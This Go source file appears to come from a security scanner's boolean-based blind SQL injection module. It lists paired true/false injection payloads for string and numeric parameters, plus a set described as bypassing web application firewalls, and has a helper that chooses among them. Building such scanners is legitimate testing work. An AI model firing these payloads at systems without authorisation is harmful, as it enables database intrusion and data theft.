package sqli_boolean_blind

// payloadPair represents a TRUE/FALSE payload pair for boolean-based blind SQLi testing.
type payloadPair struct {
	context   string // "string", "numeric", "bypass"
	trueVal   string
	falseVal  string
}

// stringPayloads are payloads for string context injection points.
var stringPayloads = []payloadPair{
	{context: "string", trueVal: "' OR '1'='1", falseVal: "' OR '1'='2"},
	{context: "string", trueVal: "' OR 1=1--", falseVal: "' OR 1=2--"},
	{context: "string", trueVal: "\" OR \"1\"=\"1", falseVal: "\" OR \"1\"=\"2"},
	{context: "string", trueVal: "' OR 'a'='a", falseVal: "' OR 'a'='b"},
	{context: "string", trueVal: "' AND CASE WHEN 1=1 THEN 1 ELSE 0 END--", falseVal: "' AND CASE WHEN 1=2 THEN 1 ELSE 0 END--"},
}

// numericPayloads are payloads for numeric context injection points.
var numericPayloads = []payloadPair{
	{context: "numeric", trueVal: " OR 1=1", falseVal: " OR 1=2"},
	{context: "numeric", trueVal: " OR 1=1--", falseVal: " OR 1=2--"},
	{context: "numeric", trueVal: ") OR (1=1", falseVal: ") OR (1=2"},
}

// bypassPayloads are payloads designed to bypass WAFs.
var bypassPayloads = []payloadPair{
	{context: "bypass", trueVal: "'/**/OR/**/1=1--", falseVal: "'/**/OR/**/1=2--"},
	{context: "bypass", trueVal: "' OR 1=1#", falseVal: "' OR 1=2#"},
	{context: "bypass", trueVal: "%27 OR 1=1--", falseVal: "%27 OR 1=2--"},
	{context: "bypass", trueVal: "' OR 1=1;--", falseVal: "' OR 1=2;--"},
}

// getPayloadsForValue selects appropriate payloads based on the parameter's base value.
func getPayloadsForValue(baseValue string) []payloadPair {
	if isNumericValue(baseValue) {
		return append(numericPayloads, bypassPayloads...)
	}
	return append(stringPayloads, bypassPayloads...)
}

// isNumericValue checks if a string looks like a number.
func isNumericValue(s string) bool {
	if s == "" {
		return false
	}
	for i, c := range s {
		if c == '-' && i == 0 {
			continue
		}
		if c == '.' {
			continue
		}
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}
